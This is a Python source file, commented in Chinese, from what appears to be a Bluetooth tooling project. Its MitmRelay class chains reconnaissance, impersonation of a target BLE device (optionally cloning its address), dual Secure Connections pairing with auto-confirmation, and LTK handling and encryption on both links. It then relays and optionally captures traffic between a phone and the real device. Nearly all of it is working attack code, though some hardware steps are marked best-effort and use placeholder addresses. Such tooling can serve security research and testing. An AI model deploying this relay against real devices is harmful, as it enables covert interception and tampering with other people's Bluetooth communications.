"""MitmRelay —— recon → impersonate → relay 三阶段编排器。

把已有的 MITM 组件(recon/impersonate/AclRelay/ScPairing)装配成一条
"目标 ↔ 中间人 ↔ 手机" 的 BLE 透传链路。

两大部分:

1. UNIT-TESTABLE 核心(本文件被 fake 单测覆盖):
   ``_build_relay`` —— 构造两侧 ScPairing(phone=responder, target=initiator),
   把每个 ScPairing 的 set_output 接到本侧的 SMP-ACL 发送器,返回一个
   smp_handler 会把 CID-0x06 PDU 路由到对应 ScPairing 的 AclRelay。
   这段没有真实控制器也能完整跑通。

2. 结构性 HCI 接线(``run_relay``,硬件验证,非单测):
   等连接完成 → 取 handle + acl_max_payload → _build_relay → 注册 ACL 回调 →
   驱动配对 → 配对完成后用 HCI 在两侧启用加密。需要真实链路,故 best-effort。

HARD RULE:不 import pybluehost.l2cap/.ble/.classic/.gap/.profiles/.stack。
"""
from __future__ import annotations

import asyncio
import logging
from typing import TYPE_CHECKING, Callable, Optional

from pybluehost.cli.app.mitm.acl import CID_SMP, encode_l2cap_basic, fragment
from pybluehost.cli.app.mitm.capture import BtsnoopCaptureTap, NullTap
from pybluehost.cli.app.mitm.impersonate import start_impersonation
from pybluehost.cli.app.mitm.pairing.delegate import AutoConfirmDelegate, PairingDelegate
from pybluehost.cli.app.mitm.pairing.smp import ScPairing
from pybluehost.cli.app.mitm.recon import scan_for_target
from pybluehost.cli.app.mitm.relay import AclRelay, RelaySide
from pybluehost.hci.constants import (
    HCI_LE_LONG_TERM_KEY_REQUEST_REPLY,
    HCI_LE_START_ENCRYPTION,
    LEMetaSubEvent,
)
from pybluehost.hci.packets import HCI_LE_Meta_Event, HCICommand, HCIEvent

if TYPE_CHECKING:
    from pybluehost.cli.app.mitm.controllers import ControllerPair
    from pybluehost.cli.app.mitm.recon import ClonedIdentity
    from pybluehost.hci.controller import HCIController

logger = logging.getLogger(__name__)


def _addr_str_to_le7(addr: str, addr_type: int) -> bytes:
    """把 "AA:BB:..":addr_type 转成 ScPairing 用的 7 字节 (type || 6 byte LE addr)。"""
    parts = [int(x, 16) for x in addr.split(":")]
    return bytes([addr_type & 0x01]) + bytes(reversed(parts))


class MitmRelay:
    def __init__(
        self,
        pair: "ControllerPair",
        *,
        target_addr: Optional[str] = None,
        target_name: Optional[str] = None,
        btsnoop: Optional[str] = None,
        clone_address: bool = False,
        delegate: Optional[PairingDelegate] = None,
        mode: str = "le",
    ) -> None:
        self._pair = pair
        self._target_addr = target_addr
        self._target_name = target_name
        self._clone_address = clone_address
        self._delegate: PairingDelegate = delegate or AutoConfirmDelegate()
        self._mode = mode
        self._capture = BtsnoopCaptureTap(btsnoop) if btsnoop else NullTap()

        self._identity: Optional["ClonedIdentity"] = None
        self._relay: Optional[AclRelay] = None
        self._pairings: dict[str, ScPairing] = {}
        self._sides: dict[str, RelaySide] = {}

    # ------------------------------------------------------------------ recon
    async def run_recon(self) -> None:
        self._identity = await scan_for_target(
            self._pair.upstream,
            target_addr=self._target_addr,
            target_name=self._target_name,
        )
        logger.info(
            "recon done: target=%s name=%s",
            self._identity.address, self._identity.name,
        )

    # ----------------------------------------------------------- impersonate
    async def run_impersonate(self) -> None:
        if self._identity is None:
            raise RuntimeError("run_recon() 必须先于 run_impersonate() 调用")
        await start_impersonation(
            self._pair.downstream,
            self._identity,
            clone_address=self._clone_address,
        )

    # ----------------------------------------------- UNIT-TESTABLE core
    def _build_relay(
        self,
        phone_side: RelaySide,
        target_side: RelaySide,
        phone_local_addr: bytes,
        phone_peer_addr: bytes,
        target_local_addr: bytes,
        target_peer_addr: bytes,
    ) -> AclRelay:
        """装配 SMP↔ScPairing↔ACL 桥接,返回 AclRelay。

        - phone 侧(downstream,面向手机)= responder;
        - target 侧(upstream,面向真实目标)= initiator。
        - 每个 ScPairing 的 set_output 接到本侧的 SMP-ACL 发送器;
        - smp_handler 把某侧收到的 CID-0x06 PDU feed 给同侧 ScPairing。
        """
        self._pairings = {
            "phone": ScPairing(
                role="responder",
                local_addr=phone_local_addr,
                peer_addr=phone_peer_addr,
                delegate=self._delegate,
                side_name="phone",
            ),
            "target": ScPairing(
                role="initiator",
                local_addr=target_local_addr,
                peer_addr=target_peer_addr,
                delegate=self._delegate,
                side_name="target",
            ),
        }
        self._sides = {"phone": phone_side, "target": target_side}

        for name in self._pairings:
            self._pairings[name].set_output(self._make_smp_emitter(name))

        async def smp_handler(side_name: str, cid: int, payload: bytes) -> None:
            pairing = self._pairings.get(side_name)
            if pairing is None:
                logger.warning("收到未知侧 %r 的 SMP PDU,丢弃", side_name)
                return
            await pairing.feed(payload)

        self._relay = AclRelay(
            phone_side=phone_side,
            target_side=target_side,
            capture=self._capture,
            smp_handler=smp_handler,
            on_teardown=None,
        )
        return self._relay

    def _make_smp_emitter(self, name: str) -> Callable[[bytes], None]:
        """返回一个 SYNC 回调:把 ScPairing 发出的 SMP PDU 异步编成 ACL 发到本侧。"""

        def emit(pdu: bytes) -> None:
            asyncio.ensure_future(self._send_smp(name, pdu))

        return emit

    async def _send_smp(self, name: str, pdu: bytes) -> None:
        side = self._sides[name]
        l2 = encode_l2cap_basic(CID_SMP, pdu)
        for frag in fragment(
            handle=side.handle, l2cap_pdu=l2, max_payload=side.acl_max_payload
        ):
            await side.send_acl(frag.handle, frag.pb_flag, frag.data)

    # ------------------------------------------------------------------ relay
    async def run_relay(self) -> None:
        """结构性 HCI 接线(硬件验证,非单测)。

        本方法的连接/加密路径需要真实链路,故为 best-effort:在没有真实
        控制器/对端的环境里,连接完成事件不会到来,等待会超时。被 fake
        单测覆盖的是 _build_relay + SMP 桥接(可独立验证),这里只是把它
        接到真实 HCI 事件上。
        """
        upstream = self._pair.upstream
        downstream = self._pair.downstream

        # --- 1. 等两侧连接完成,取 handle ---------------------------------
        # downstream 面向手机(手机连上我们的伪装广播);
        # upstream 由本机作为 initiator 连真实目标(发起连接的 HCI 命令属于
        #   连接建立流程,硬件验证;此处只等连接完成事件)。
        target_handle = await self._await_le_connection(upstream)
        phone_handle = await self._await_le_connection(downstream)

        # --- 2. 取每侧的 ACL 最大负载 ------------------------------------
        # 优先 LE buffer 大小,回退到经典 ACL buffer 大小。
        target_max = (
            upstream.le_acl_packet_length or upstream.acl_packet_length or 27
        )
        phone_max = (
            downstream.le_acl_packet_length or downstream.acl_packet_length or 27
        )

        # --- 3. 地址(用于 SMP f5/f6 推导) ------------------------------
        # 真实地址来自连接完成事件/控制器;无法从纯结构层稳妙拿到本机地址,
        # 故此处用占位地址 —— 硬件验证时应替换为真实 A1/A2。
        phone_local = bytes(7)
        phone_peer = bytes(7)
        target_local = bytes(7)
        target_peer = bytes(7)
        if self._identity is not None:
            target_peer = _addr_str_to_le7(
                self._identity.address, self._identity.address_type
            )

        # --- 4. 构造中继(UNIT-TESTABLE 核心) ----------------------------
        phone_side = RelaySide(
            name="phone",
            handle=phone_handle,
            acl_max_payload=phone_max,
            send_acl=downstream.send_acl_data,
        )
        target_side = RelaySide(
            name="target",
            handle=target_handle,
            acl_max_payload=target_max,
            send_acl=upstream.send_acl_data,
        )
        relay = self._build_relay(
            phone_side, target_side,
            phone_local, phone_peer, target_local, target_peer,
        )

        # --- 5. 注册 ACL 回调 --------------------------------------------
        downstream.set_upstream(on_acl_data=relay.on_phone_acl)
        upstream.set_upstream(on_acl_data=relay.on_target_acl)

        # --- 6. 加密接线(best-effort,硬件验证) -------------------------
        # downstream(我们扮 responder):手机发起加密 → LE LTK Request →
        #   我们用 phone 侧 ScPairing 算出的 LTK 回应。
        def _on_phone_ltk_request(handle: int, rand: bytes, ediv: int) -> None:
            ltk = self._pairings["phone"].ltk
            if ltk is None:
                logger.warning("phone LTK 尚未就绪,无法应答 LE_LTK_Request")
                return
            params = handle.to_bytes(2, "little") + ltk
            asyncio.ensure_future(
                downstream.send_command(
                    HCICommand(
                        opcode=HCI_LE_LONG_TERM_KEY_REQUEST_REPLY, parameters=params
                    )
                )
            )

        downstream.on_le_ltk_request(_on_phone_ltk_request)

        # --- 7. 驱动配对:upstream 作 initiator 发起,downstream 等待 -----
        await self._pairings["target"].start()

        # upstream(我们扮 initiator 对真实目标):配对完成后用 LE Start
        # Encryption 启用加密。此处轮询配对完成(best-effort,硬件验证)。
        async def _enable_target_encryption() -> None:
            pairing = self._pairings["target"]
            # 等待 initiator 配对完成,拿到 LTK 后发 LE_Start_Encryption。
            for _ in range(2000):  # ~20s 上限,避免无限等待
                if pairing.is_complete() and pairing.ltk is not None:
                    break
                await asyncio.sleep(0.01)
            if not pairing.is_complete() or pairing.ltk is None:
                logger.warning("target 侧配对未完成,跳过 LE_Start_Encryption")
                return
            # LE_Start_Encryption: handle(2) || rand(8) || ediv(2) || ltk(16)
            params = (
                target_handle.to_bytes(2, "little")
                + bytes(8)  # rand = 0 (SC)
                + bytes(2)  # ediv = 0 (SC)
                + pairing.ltk
            )
            await upstream.send_command(
                HCICommand(opcode=HCI_LE_START_ENCRYPTION, parameters=params)
            )

        await _enable_target_encryption()

    async def _await_le_connection(self, controller: "HCIController") -> int:
        """等待一个 LE_Connection_Complete / Enhanced 子事件,返回 connection handle。

        best-effort:在没有真实硬件时没有事件会到来。复用 controller 的
        on_hci_event 链(暂存并恢复前序回调,避免吞掉其它事件)。
        """
        loop = asyncio.get_event_loop()
        fut: asyncio.Future[int] = loop.create_future()
        prev = controller._on_hci_event  # type: ignore[attr-defined]

        def on_event(event: HCIEvent) -> None:
            if isinstance(event, HCI_LE_Meta_Event) and event.subevent_code in (
                LEMetaSubEvent.LE_CONNECTION_COMPLETE,
                LEMetaSubEvent.LE_ENHANCED_CONNECTION_COMPLETE,
            ):
                params = event.subevent_parameters
                # subevent: status(1) handle(2) role(1) ...
                if len(params) >= 3 and params[0] == 0x00 and not fut.done():
                    handle = int.from_bytes(params[1:3], "little")
                    fut.set_result(handle)
            if prev is not None:
                result = prev(event)
                if asyncio.iscoroutine(result):
                    asyncio.ensure_future(result)

        controller.set_upstream(on_hci_event=on_event)
        try:
            return await fut
        finally:
            controller.set_upstream(on_hci_event=prev)

    # --------------------------------------------------------------- teardown
    async def teardown(self) -> None:
        if self._relay is not None:
            await self._relay.teardown()
        await self._pair.close()
